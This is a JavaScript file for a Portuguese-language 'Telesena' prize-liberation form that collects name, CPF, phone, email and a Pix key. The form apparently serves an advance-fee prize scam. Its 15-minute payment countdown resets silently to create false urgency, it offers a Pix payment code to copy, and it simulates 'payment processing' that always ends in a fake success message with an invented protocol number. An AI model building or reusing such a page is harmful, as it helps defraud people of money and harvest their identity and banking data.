// Form Redemption Script - Telesena 3-Step Prize Liberation Form
// Manages step navigation, form validation, and payment processing

// Global variables
let currentStep = 1;
let formData = {};
let paymentTimerInterval;
let currentPixKey = '';
let currentKeyType = 'cpf';

// Initialize page when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    initializePage();
    setupEventListeners();
    startPaymentTimer();
    populatePrizeData();
});

// Initialize page components
function initializePage() {
    // Set initial step
    showStep(1);
    
    // Initialize form data
    formData = {
        prizeAmount: 'R$ 2.500,00',
        protocol: 'TSN-2025-001234',
        fullName: '',
        cpf: '',
        phone: '',
        email: '',
        pixKeyType: 'cpf',
        pixKey: '',
        termsAccepted: false
    };
    
    // Set default key type
    updateKeyType('cpf');
    
    // Update button states
    updateNavigationButtons();
}

// Setup all event listeners
function setupEventListeners() {
    // Step 1 - Personal data form
    setupStep1Listeners();
    
    // Step 2 - Payment and Pix key
    setupStep2Listeners();
    
    // Step 3 - Confirmation
    setupStep3Listeners();
    
    // Navigation buttons
    setupNavigationListeners();
}

// Setup Step 1 event listeners
function setupStep1Listeners() {
    const fields = ['full-name', 'cpf', 'phone', 'email'];
    
    fields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('input', function() {
                validateField(fieldId, this.value);
                updateStep1Button();
            });
            
            field.addEventListener('blur', function() {
                validateField(fieldId, this.value);
            });
        }
    });
}

// Setup Step 2 event listeners
function setupStep2Listeners() {
    // Key type selector
    const keyTypeInputs = document.querySelectorAll('input[name="key-type"]');
    keyTypeInputs.forEach(input => {
        input.addEventListener('change', function() {
            updateKeyType(this.value);
        });
    });
    
    // Pix key input
    const pixKeyInput = document.getElementById('pix-key-input');
    if (pixKeyInput) {
        pixKeyInput.addEventListener('input', function() {
            validatePixKey(this.value);
            updateStep2Button();
        });
        
        pixKeyInput.addEventListener('blur', function() {
            validatePixKey(this.value);
        });
    }
}

// Setup Step 3 event listeners
function setupStep3Listeners() {
    const termsCheckbox = document.getElementById('terms-agreement');
    if (termsCheckbox) {
        termsCheckbox.addEventListener('change', function() {
            formData.termsAccepted = this.checked;
            updateStep3Button();
        });
    }
}

// Setup navigation event listeners
function setupNavigationListeners() {
    // Next buttons
    const nextStep1 = document.getElementById('next-step-1');
    const nextStep2 = document.getElementById('next-step-2');
    
    if (nextStep1) {
        nextStep1.addEventListener('click', () => goToStep(2));
    }
    
    if (nextStep2) {
        nextStep2.addEventListener('click', () => goToStep(3));
    }
    
    // Previous buttons
    const prevStep2 = document.getElementById('prev-step-2');
    const prevStep3 = document.getElementById('prev-step-3');
    
    if (prevStep2) {
        prevStep2.addEventListener('click', () => goToStep(1));
    }
    
    if (prevStep3) {
        prevStep3.addEventListener('click', () => goToStep(2));
    }
    
    // Confirm payment button
    const confirmPayment = document.getElementById('confirm-payment');
    if (confirmPayment) {
        confirmPayment.addEventListener('click', processPayment);
    }
}

// Populate prize data from URL parameters or localStorage
function populatePrizeData() {
    try {
        // Try to get data from URL parameters first
        const urlParams = new URLSearchParams(window.location.search);
        const prizeValue = urlParams.get('prize') || 'R$ 2.500,00';
        const userName = urlParams.get('name') || '';
        const protocol = urlParams.get('protocol') || 'TSN-2025-001234';
        
        // Update prize display
        const prizeAmountElements = document.querySelectorAll('#prize-amount, .amount');
        prizeAmountElements.forEach(element => {
            if (element) {
                element.textContent = prizeValue.replace('R$ ', '');
            }
        });
        
        const protocolElements = document.querySelectorAll('#prize-protocol');
        protocolElements.forEach(element => {
            if (element) {
                element.textContent = protocol;
            }
        });
        
        // Set expiry date (30 days from now)
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + 30);
        const expiryElement = document.getElementById('prize-expiry');
        if (expiryElement) {
            expiryElement.textContent = expiryDate.toLocaleDateString('pt-BR');
        }
        
        // Pre-fill name if provided
        if (userName) {
            const nameField = document.getElementById('full-name');
            if (nameField) {
                nameField.value = userName;
                formData.fullName = userName;
                validateField('full-name', userName);
            }
        }
        
        // Update form data
        formData.prizeAmount = prizeValue;
        formData.protocol = protocol;
        
    } catch (error) {
        console.log('Using default prize data');
    }
}

// Show specific step
function showStep(stepNumber) {
    // Hide all steps
    const steps = document.querySelectorAll('.form-step');
    steps.forEach(step => {
        step.classList.remove('active');
    });
    
    // Show target step
    const targetStep = document.getElementById(`step-${stepNumber}`);
    if (targetStep) {
        targetStep.classList.add('active');
    }
    
    // Update progress indicator
    updateProgressIndicator(stepNumber);
    
    // Update current step
    currentStep = stepNumber;
    
    // Update navigation buttons
    updateNavigationButtons();
    
    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Update progress indicator
function updateProgressIndicator(activeStep) {
    const steps = document.querySelectorAll('.step');
    
    steps.forEach((step, index) => {
        const stepNumber = index + 1;
        
        // Remove all classes
        step.classList.remove('active', 'completed');
        
        // Add appropriate class
        if (stepNumber < activeStep) {
            step.classList.add('completed');
        } else if (stepNumber === activeStep) {
            step.classList.add('active');
        }
    });
}

// Go to specific step
function goToStep(stepNumber) {
    if (stepNumber < 1 || stepNumber > 3) return;
    
    // Validate current step before proceeding
    if (stepNumber > currentStep) {
        if (!validateCurrentStep()) {
            showNotification('Por favor, complete todos os campos obrigatórios', 'error');
            return;
        }
    }
    
    // Save current step data
    saveCurrentStepData();
    
    // Show target step
    showStep(stepNumber);
    
    // Update summary if going to step 3
    if (stepNumber === 3) {
        updateSummary();
    }
}

// Validate current step
function validateCurrentStep() {
    switch (currentStep) {
        case 1:
            return validateStep1();
        case 2:
            return validateStep2();
        case 3:
            return validateStep3();
        default:
            return true;
    }
}

// Validate Step 1
function validateStep1() {
    const fields = ['full-name', 'cpf', 'phone', 'email'];
    let isValid = true;
    
    fields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field && !validateField(fieldId, field.value)) {
            isValid = false;
        }
    });
    
    return isValid;
}

// Validate Step 2
function validateStep2() {
    return currentPixKey.length > 0;
}

// Validate Step 3
function validateStep3() {
    return formData.termsAccepted;
}

// Save current step data
function saveCurrentStepData() {
    switch (currentStep) {
        case 1:
            formData.fullName = document.getElementById('full-name')?.value || '';
            formData.cpf = document.getElementById('cpf')?.value || '';
            formData.phone = document.getElementById('phone')?.value || '';
            formData.email = document.getElementById('email')?.value || '';
            break;
        case 2:
            formData.pixKeyType = currentKeyType;
            formData.pixKey = currentPixKey;
            break;
        case 3:
            formData.termsAccepted = document.getElementById('terms-agreement')?.checked || false;
            break;
    }
}

// Validate individual field
function validateField(fieldId, value) {
    const validation = document.getElementById(`${fieldId.replace('-', '-')}-validation`);
    let isValid = false;
    let message = '';
    
    switch (fieldId) {
        case 'full-name':
            isValid = value.trim().length >= 3 && /^[a-zA-ZÀ-ÿ\s]+$/.test(value.trim());
            message = isValid ? '✓ Nome válido' : '✗ Nome deve ter pelo menos 3 caracteres e conter apenas letras';
            break;
        case 'cpf':
            isValid = validateCPF(value);
            message = isValid ? '✓ CPF válido' : '✗ CPF inválido';
            break;
        case 'phone':
            isValid = validatePhone(value);
            message = isValid ? '✓ Telefone válido' : '✗ Telefone inválido';
            break;
        case 'email':
            isValid = validateEmail(value);
            message = isValid ? '✓ E-mail válido' : '✗ E-mail inválido';
            break;
    }
    
    // Update validation display
    if (validation) {
        validation.textContent = value.trim() ? message : '';
        validation.className = `input-validation ${value.trim() ? (isValid ? 'valid' : 'invalid') : ''}`;
    }
    
    // Store valid data
    if (isValid) {
        switch (fieldId) {
            case 'full-name':
                formData.fullName = value.trim();
                break;
            case 'cpf':
                formData.cpf = value;
                break;
            case 'phone':
                formData.phone = value;
                break;
            case 'email':
                formData.email = value;
                break;
        }
    }
    
    return isValid;
}

// Update key type and input placeholder
function updateKeyType(type) {
    currentKeyType = type;
    const input = document.getElementById('pix-key-input');
    const icon = document.getElementById('key-icon');
    
    if (!input || !icon) return;
    
    // Clear current value and validation
    input.value = '';
    currentPixKey = '';
    clearPixKeyValidation();
    
    // Update icon and placeholder based on type
    switch (type) {
        case 'cpf':
            icon.className = 'fas fa-id-card input-icon';
            input.placeholder = 'Digite seu CPF (000.000.000-00)';
            input.maxLength = 14;
            break;
        case 'email':
            icon.className = 'fas fa-envelope input-icon';
            input.placeholder = 'Digite seu e-mail (exemplo@email.com)';
            input.maxLength = 100;
            break;
        case 'phone':
            icon.className = 'fas fa-phone input-icon';
            input.placeholder = 'Digite seu celular (11) 99999-9999';
            input.maxLength = 15;
            break;
        case 'random':
            icon.className = 'fas fa-key input-icon';
            input.placeholder = 'Digite sua chave aleatória';
            input.maxLength = 100;
            break;
    }
    
    updateStep2Button();
}

// Validate Pix key based on type
function validatePixKey(value) {
    const validation = document.getElementById('key-validation');
    if (!validation) return false;
    
    let isValid = false;
    let message = '';
    
    if (!value.trim()) {
        clearPixKeyValidation();
        return false;
    }
    
    switch (currentKeyType) {
        case 'cpf':
            isValid = validateCPF(value);
            message = isValid ? '✓ CPF válido' : '✗ CPF inválido';
            break;
        case 'email':
            isValid = validateEmail(value);
            message = isValid ? '✓ E-mail válido' : '✗ E-mail inválido';
            break;
        case 'phone':
            isValid = validatePhone(value);
            message = isValid ? '✓ Telefone válido' : '✗ Telefone inválido';
            break;
        case 'random':
            isValid = validateRandomKey(value);
            message = isValid ? '✓ Chave válida' : '✗ Chave deve ter pelo menos 32 caracteres';
            break;
    }
    
    // Update validation display
    validation.textContent = message;
    validation.className = `input-validation ${isValid ? 'valid' : 'invalid'}`;
    
    // Store valid key
    if (isValid) {
        currentPixKey = value;
    } else {
        currentPixKey = '';
    }
    
    return isValid;
}

// CPF validation
function validateCPF(cpf) {
    // Remove formatting
    cpf = cpf.replace(/[^\d]/g, '');
    
    // Check length
    if (cpf.length !== 11) return false;
    
    // Check for repeated digits
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    
    // Validate check digits
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;
    
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;
    
    return true;
}

// Email validation
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email) && email.length >= 5;
}

// Phone validation
function validatePhone(phone) {
    const phoneRegex = /^\(?[1-9]{2}\)?\s?9?[0-9]{4}-?[0-9]{4}$/;
    const cleanPhone = phone.replace(/[^\d]/g, '');
    return phoneRegex.test(phone) && (cleanPhone.length === 10 || cleanPhone.length === 11);
}

// Random key validation
function validateRandomKey(key) {
    return key.length >= 32 && /^[a-zA-Z0-9\-]+$/.test(key);
}

// Clear Pix key validation message
function clearPixKeyValidation() {
    const validation = document.getElementById('key-validation');
    if (validation) {
        validation.textContent = '';
        validation.className = 'input-validation';
    }
}

// Update navigation buttons
function updateNavigationButtons() {
    updateStep1Button();
    updateStep2Button();
    updateStep3Button();
}

// Update Step 1 button
function updateStep1Button() {
    const button = document.getElementById('next-step-1');
    if (!button) return;
    
    const isValid = validateStep1();
    button.disabled = !isValid;
}

// Update Step 2 button
function updateStep2Button() {
    const button = document.getElementById('next-step-2');
    if (!button) return;
    
    const isValid = validateStep2();
    button.disabled = !isValid;
}

// Update Step 3 button
function updateStep3Button() {
    const button = document.getElementById('confirm-payment');
    if (!button) return;
    
    const isValid = validateStep3();
    button.disabled = !isValid;
}

// Update summary in Step 3
function updateSummary() {
    // Update prize summary
    const summaryPrize = document.getElementById('summary-prize');
    const summaryProtocol = document.getElementById('summary-protocol');
    const summaryName = document.getElementById('summary-name');
    const summaryPixKey = document.getElementById('summary-pix-key');
    
    if (summaryPrize) summaryPrize.textContent = formData.prizeAmount;
    if (summaryProtocol) summaryProtocol.textContent = formData.protocol;
    if (summaryName) summaryName.textContent = formData.fullName;
    
    if (summaryPixKey) {
        // Mask the Pix key for privacy
        let maskedKey = formData.pixKey;
        if (formData.pixKeyType === 'cpf') {
            maskedKey = maskedKey.replace(/(\d{3})\d{3}(\d{3})/, '$1***$2');
        } else if (formData.pixKeyType === 'email') {
            const [user, domain] = maskedKey.split('@');
            maskedKey = `${user.substring(0, 2)}***@${domain}`;
        } else if (formData.pixKeyType === 'phone') {
            maskedKey = maskedKey.replace(/(\d{2})\d{5}(\d{4})/, '$1*****$2');
        } else {
            maskedKey = `${maskedKey.substring(0, 8)}***${maskedKey.substring(maskedKey.length - 4)}`;
        }
        summaryPixKey.textContent = maskedKey;
    }
}

// Process payment simulation
function processPayment() {
    if (!validateStep3()) {
        showNotification('Por favor, aceite os termos para continuar', 'error');
        return;
    }
    
    // Save final data
    saveCurrentStepData();
    
    // Show loading
    showLoading('Processando pagamento...', 'Aguarde enquanto confirmamos seu pagamento');
    
    // Simulate payment processing
    setTimeout(() => {
        // Update loading message
        updateLoading('Validando dados...', 'Verificando informações bancárias');
        
        setTimeout(() => {
            // Update loading message again
            updateLoading('Liberando prêmio...', 'Preparando transferência do prêmio');
            
            setTimeout(() => {
                // Hide loading and show success
                hideLoading();
                showSuccessStep();
                
                // Show success notification
                showNotification('Prêmio liberado com sucesso!', 'success');
                
            }, 2000);
        }, 2000);
    }, 3000);
}

// Show success step
function showSuccessStep() {
    // Hide all form steps
    const steps = document.querySelectorAll('.form-step');
    steps.forEach(step => {
        step.classList.remove('active');
    });
    
    // Show success step
    const successStep = document.getElementById('step-success');
    if (successStep) {
        successStep.style.display = 'block';
        successStep.classList.add('active');
        
        // Populate success data
        const successPrize = document.getElementById('success-prize');
        const successPixKey = document.getElementById('success-pix-key');
        const successProtocol = document.getElementById('success-protocol');
        
        if (successPrize) {
            successPrize.textContent = formData.prizeAmount;
        }
        
        if (successPixKey) {
            // Mask the Pix key for privacy
            let maskedKey = formData.pixKey;
            if (formData.pixKeyType === 'cpf') {
                maskedKey = maskedKey.replace(/(\d{3})\d{3}(\d{3})/, '$1***$2');
            } else if (formData.pixKeyType === 'email') {
                const [user, domain] = maskedKey.split('@');
                maskedKey = `${user.substring(0, 2)}***@${domain}`;
            } else if (formData.pixKeyType === 'phone') {
                maskedKey = maskedKey.replace(/(\d{2})\d{5}(\d{4})/, '$1*****$2');
            } else {
                maskedKey = `${maskedKey.substring(0, 8)}***${maskedKey.substring(maskedKey.length - 4)}`;
            }
            successPixKey.textContent = maskedKey;
        }
        
        if (successProtocol) {
            // Generate a liberation protocol
            const timestamp = Date.now().toString().slice(-6);
            successProtocol.textContent = `TSN-LIB-2025-${timestamp}`;
        }
    }
    
    // Update progress to show completion
    const steps = document.querySelectorAll('.step');
    steps.forEach(step => {
        step.classList.add('completed');
        step.classList.remove('active');
    });
    
    // Stop timer
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
    
    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Payment timer (15 minutes)
function startPaymentTimer() {
    let totalSeconds = 15 * 60; // 15 minutes
    
    paymentTimerInterval = setInterval(() => {
        totalSeconds--;
        
        if (totalSeconds <= 0) {
            // Reset timer
            totalSeconds = 15 * 60;
        }
        
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        
        const timerElement = document.getElementById('payment-timer');
        if (timerElement) {
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
    }, 1000);
}

// Copy Pix code to clipboard
function copyPixCode() {
    const pixCodeInput = document.getElementById('pix-code');
    if (!pixCodeInput) return;
    
    // Select and copy the text
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999); // For mobile devices
    
    try {
        document.execCommand('copy');
        showNotification('Código Pix copiado!', 'success');
    } catch (err) {
        // Fallback for modern browsers
        navigator.clipboard.writeText(pixCodeInput.value).then(() => {
            showNotification('Código Pix copiado!', 'success');
        }).catch(() => {
            showNotification('Erro ao copiar código', 'error');
        });
    }
}

// Loading functionality
function showLoading(title, message) {
    const overlay = document.getElementById('loading-overlay');
    const titleElement = document.getElementById('loading-title');
    const messageElement = document.getElementById('loading-message');
    
    if (overlay) overlay.style.display = 'flex';
    if (titleElement) titleElement.textContent = title;
    if (messageElement) messageElement.textContent = message;
}

function updateLoading(title, message) {
    const titleElement = document.getElementById('loading-title');
    const messageElement = document.getElementById('loading-message');
    
    if (titleElement) titleElement.textContent = title;
    if (messageElement) messageElement.textContent = message;
}

function hideLoading() {
    const overlay = document.getElementById('loading-overlay');
    if (overlay) overlay.style.display = 'none';
}

// Notification system
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    const messageElement = notification.querySelector('.notification-message');
    const iconElement = notification.querySelector('.notification-icon');
    
    if (!notification || !messageElement || !iconElement) return;
    
    // Set message
    messageElement.textContent = message;
    
    // Set icon and class based on type
    notification.className = `notification ${type}`;
    
    switch (type) {
        case 'success':
            iconElement.className = 'fas fa-check-circle notification-icon';
            break;
        case 'error':
            iconElement.className = 'fas fa-exclamation-circle notification-icon';
            break;
        case 'warning':
            iconElement.className = 'fas fa-exclamation-triangle notification-icon';
            break;
        default:
            iconElement.className = 'fas fa-info-circle notification-icon';
    }
    
    // Show notification
    notification.style.display = 'block';
    
    // Hide after 4 seconds
    setTimeout(() => {
        notification.style.display = 'none';
    }, 4000);
}

// Input formatting
document.addEventListener('input', function(e) {
    const target = e.target;
    
    // Format CPF input
    if (target.id === 'cpf' || (target.id === 'pix-key-input' && currentKeyType === 'cpf')) {
        let value = target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        target.value = value;
    }
    
    // Format phone input
    if (target.id === 'phone' || (target.id === 'pix-key-input' && currentKeyType === 'phone')) {
        let value = target.value.replace(/\D/g, '');
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{4,5})(\d{4})$/, '$1-$2');
        target.value = value;
    }
});

// Prevent form submission on Enter key
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
        e.preventDefault();
        
        // Handle Enter key based on current step
        switch (currentStep) {
            case 1:
                if (validateStep1()) {
                    goToStep(2);
                }
                break;
            case 2:
                if (validateStep2()) {
                    goToStep(3);
                }
                break;
            case 3:
                if (validateStep3()) {
                    processPayment();
                }
                break;
        }
    }
});

// Smooth scrolling for anchor links
document.addEventListener('click', function(e) {
    if (e.target.tagName === 'A' && e.target.getAttribute('href')?.startsWith('#')) {
        e.preventDefault();
        const targetId = e.target.getAttribute('href').substring(1);
        const targetElement = document.getElementById(targetId);
        
        if (targetElement) {
            targetElement.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    }
});

// Page visibility change handling
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        // Page is hidden, pause timers if needed
        console.log('Page hidden');
    } else {
        // Page is visible, resume timers if needed
        console.log('Page visible');
    }
});

// Cleanup on page unload
window.addEventListener('beforeunload', function() {
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
});

// Expose global functions for HTML onclick handlers
window.copyPixCode = copyPixCode;

